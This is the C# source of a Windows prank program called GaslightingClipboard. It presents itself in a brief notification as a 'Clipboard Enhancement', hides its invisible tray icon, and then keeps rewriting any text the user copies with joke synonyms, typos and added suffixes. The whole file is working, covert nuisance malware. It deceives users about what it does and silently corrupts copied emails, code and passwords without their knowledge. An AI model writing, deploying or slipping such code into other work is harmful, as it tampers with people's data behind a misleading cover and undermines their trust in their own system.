using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

class GaslightingClipboard : ApplicationContext
{
    static readonly Dictionary<string, string[]> Synonyms = new(StringComparer.OrdinalIgnoreCase)
    {
        {"the",      new[] {"teh", "da", "ye olde", "this here"}},
        {"a",        new[] {"one", "an", "some", "a single"}},
        {"an",       new[] {"one", "a", "some"}},
        {"and",      new[] {"plus", "also", "&", "adn"}},
        {"or",       new[] {"either", "alternatively", "xor"}},
        {"but",      new[] {"however", "yet", "though"}},
        {"in",       new[] {"within", "inside", "at"}},
        {"on",       new[] {"upon", "atop", "regarding"}},
        {"at",       new[] {"located at", "in the area of"}},
        {"to",       new[] {"towards", "unto", "2"}},
        {"for",      new[] {"intended for", "because of", "fro"}},
        {"of",       new[] {"belonging to", "from", "made of"}},
        {"with",     new[] {"together with", "using", "wiht"}},
        {"by",       new[] {"via", "through", "next to"}},
        {"from",     new[] {"originating from", "since", "form"}},
        {"as",       new[] {"while", "like", "in the role of"}},
        {"is",       new[] {"equals", "exists as", "becomes"}},
        {"are",      new[] {"exist as", "constitute", "aer"}},
        {"was",      new[] {"used to be", "formerly"}},
        {"were",     new[] {"had been", "once existed as"}},
        {"you",      new[] {"thou", "u", "yuo", "yourself"}},
        {"your",     new[] {"thy", "yuor", "belonging to thou"}},
        {"it",       new[] {"that thing", "itself", "the aforementioned"}},
        {"this",     new[] {"the following", "here", "tihs"}},
        {"that",     new[] {"the prior", "yon", "taht"}},
        {"what",     new[] {"which", "pardon?", "eh?"}},
        {"when",     new[] {"at what point", "whenever"}},
        {"where",    new[] {"in what location", "whence"}},
        {"how",      new[] {"in what manner", "by which method"}},
        {"why",      new[] {"for what reason", "wherefore"}},
        {"good",     new[] {"splendid", "most excellent", "based"}},
        {"bad",      new[] {"suboptimal", "most foul"}},
        {"now",      new[] {"presently", "at this moment"}},
        {"then",     new[] {"subsequently", "thereafter"}},
        {"meeting",  new[] {"powwow", "summit", "séance", "congregation"}},
        {"email",    new[] {"e-pigeon", "digital scroll", "electronic missive"}},
        {"computer", new[] {"beep box", "magic rectangle", "thinking machine"}},
        {"password", new[] {"open sesame", "secret incantation", "magic words"}},
        {"error",    new[] {"gremlin", "unexpected feature", "cosmic hiccup"}},
        {"update",   new[] {"patch ceremony", "mystical upgrade ritual"}},
        {"deadline", new[] {"doom clock", "the reckoning", "fate timestamp"}},
        {"boss",     new[] {"supreme overlord", "big cheese", "grand poobah"}},
        {"task",     new[] {"quest", "sacred duty", "minor odyssey"}},
        {"project",  new[] {"grand endeavor", "epic scheme"}},
        {"report",   new[] {"scroll of findings", "parchment of progress"}},
        {"file",     new[] {"dossier", "arcane folder", "digital tome"}},
        {"send",     new[] {"dispatch", "hurl into ether", "cast forth"}},
        {"call",     new[] {"summon via voice portal", "ring the aether"}},
        {"team",     new[] {"guild", "band of misfits", "fellow questers"}},
        {"client",   new[] {"esteemed patron", "noble benefactor"}},
        {"review",   new[] {"divine inspection", "judgment ritual"}},
        {"plan",     new[] {"master scheme", "blueprint of fate"}},
        {"issue",    new[] {"minor cataclysm", "gremlin infestation"}},
        {"fix",      new[] {"mend reality", "banish bug", "restore order"}},
        {"note",     new[] {"scribbled prophecy", "hasty rune"}},
        {"document", new[] {"sacred text", "eternal record"}},
        {"schedule", new[] {"time-binding ritual", "fate calendar"}},
        {"time",     new[] {"temporal essence", "chrono currency"}},
        {"work",     new[] {"toil", "drudgery", "daily grind"}},
        {"code",     new[] {"arcane script", "runic instructions"}},
        {"bug",      new[] {"digital gremlin", "creature of mischief"}},
        {"thanks",   new[] {"much obliged", "gracias amigo"}},
        {"please",   new[] {"I beg thee", "pretty please"}},
        {"help",     new[] {"mayday", "SOS", "send reinforcements"}},
        {"yes",      new[] {"indubitably", "verily", "ya sure you betcha"}},
        {"no",       new[] {"nay", "negatory", "absolutely not"}},
        {"hi",       new[] {"salutations", "greetings earthling", "ahoy"}},
        {"important",new[] {"of cosmic significance", "mega important"}},
        {"asap",     new[] {"post-haste", "with fury of thousand suns"}},
    };

    static readonly string[] Suffixes = new[]
    {
        " ...probably.",
        " (I think?)",
        " — don't quote me on this.",
        " (citation needed)",
        " ...or was it the opposite?",
        " — source: trust me bro",
        " (this message will self-destruct)",
        " — anyway, moving on",
        " (no refunds)",
        " P.S. I have no idea what I'm doing.",
        " ...said no one ever.",
        " (vibes-based answer)",
        " ...allegedly.",
    };

    static readonly Random Rng = new Random();
    static string _lastClipboard = "";

    const string INITIAL_MESSAGE = "Your clipboard has been upgraded. Enjoy! :)";

    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new GaslightingClipboard());
    }

    public GaslightingClipboard()
    {
        using var bmp = new Bitmap(1, 1);
        bmp.SetPixel(0, 0, Color.Transparent);
        var icon = Icon.FromHandle(bmp.GetHicon());

        var tray = new NotifyIcon
        {
            Icon = icon,
            Visible = true,
            BalloonTipTitle = "Clipboard Enhancement Active",
            BalloonTipText = INITIAL_MESSAGE,
            BalloonTipIcon = ToolTipIcon.Info,
        };

        tray.ShowBalloonTip(3000);

        var hideTimer = new System.Windows.Forms.Timer { Interval = 4500 };
        hideTimer.Tick += (s, e) =>
        {
            tray.Visible = false;
            tray.Dispose();
            hideTimer.Dispose();
        };
        hideTimer.Start();

        SetClipboardText(INITIAL_MESSAGE);

        var worker = new Thread(ClipboardVandalLoop) { IsBackground = true };
        worker.SetApartmentState(ApartmentState.STA);
        worker.Start();
    }

    static void ClipboardVandalLoop()
    {
        while (true)
        {
            try
            {
                string current = GetClipboardText() ?? "";
                if (string.IsNullOrWhiteSpace(current) || current == _lastClipboard)
                {
                    Thread.Sleep(280);
                    continue;
                }

                _lastClipboard = current;
                string corrupted = CorruptText(current);

                if (corrupted != current)
                    SetClipboardText(corrupted);
            }
            catch { }

            Thread.Sleep(220 + Rng.Next(360));
        }
    }

    static string CorruptText(string input)
    {
        if (string.IsNullOrWhiteSpace(input)) return input;

        var parts = input.Split(' ');
        var result = new StringBuilder();

        bool isFirst = true;
        foreach (var part in parts)
        {
            if (!isFirst) result.Append(' ');
            isFirst = false;

            string word = part.TrimEnd(".,!?;:'\"".ToCharArray());
            string punctuation = part.Length > word.Length ? part[word.Length..] : "";
            string replacement = word;

            if (Synonyms.TryGetValue(word, out var options) && options.Length > 0)
            {
                replacement = options[Rng.Next(options.Length)];
                if (word.Length > 0 && char.IsUpper(word[0]) && replacement.Length > 0)
                    replacement = char.ToUpper(replacement[0]) + replacement[1..];
            }
            else if (word.Length >= 3)
            {
                int roll = Rng.Next(100);
                if      (roll < 10) replacement = SwapAdjacentLetters(word);
                else if (roll < 20) replacement = LightTypo(word);
            }

            result.Append(replacement).Append(punctuation);
        }

        string final = result.ToString();

        // Suffix appended 50% of the time
        if (Rng.Next(100) < 50)
            final += Suffixes[Rng.Next(Suffixes.Length)];

        // Rare ALL CAPS only - 1 in 500 chance, no more reversing
        if (Rng.Next(500) < 3)
            final = final.ToUpper();

        return final;
    }

    static string LightTypo(string w)
    {
        var chars = w.ToCharArray();
        int pos = Rng.Next(chars.Length);
        chars[pos] = chars[pos] switch
        {
            'e' => '3', 'a' => '@', 'i' => '1', 'o' => '0',
            's' => '5', 't' => '7', 'l' => '1', 'g' => '9',
            _ => chars[pos]
        };
        return new string(chars);
    }

    static string SwapAdjacentLetters(string w)
    {
        if (w.Length < 3) return w;
        var chars = w.ToCharArray();
        int i = Rng.Next(chars.Length - 1);
        (chars[i], chars[i + 1]) = (chars[i + 1], chars[i]);
        return new string(chars);
    }

    static string GetClipboardText()
    {
        string result = null;
        var thread = new Thread(() =>
        {
            try { if (Clipboard.ContainsText()) result = Clipboard.GetText(); }
            catch { }
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join(1000);
        return result;
    }

    static void SetClipboardText(string text)
    {
        var thread = new Thread(() =>
        {
            try { Clipboard.SetText(text); }
            catch { }
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join(1000);
    }
}